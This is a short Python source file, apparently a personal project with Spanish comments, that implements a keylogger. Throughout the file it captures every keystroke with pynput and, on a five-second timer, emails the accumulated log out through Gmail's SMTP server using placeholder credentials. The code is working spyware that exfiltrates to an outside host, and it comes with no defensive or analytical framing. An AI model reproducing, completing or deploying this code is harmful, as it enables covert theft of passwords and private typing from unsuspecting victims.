import pynput.keyboard
import threading
import smtplib 
from email.mime.text import MIMEText

class keylogger:
    def __init__(self):
        self.timer = None
        self.log = ""
        self.request_shutdown = False
        self.if_self_run=True
    def pressed_key(self,key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")
        print(self.log)


    def report(self):
        email_body = "El keylogger se ha inciiado correctamnte" if self.if_self_run else self.log
        self.send_email("Keylogger Report", email_body, "GmailSender", ["gmailReciept"],"Mail token app")
        self.log = ""

        if self.if_self_run:
            self.if_self_run=False
        if not self.request_shutdown:
            self.timer = threading.Timer(5,self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join() # esto se encarga de cerrar el listener
    def send_email(self,subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print("Email sent Successfully!")

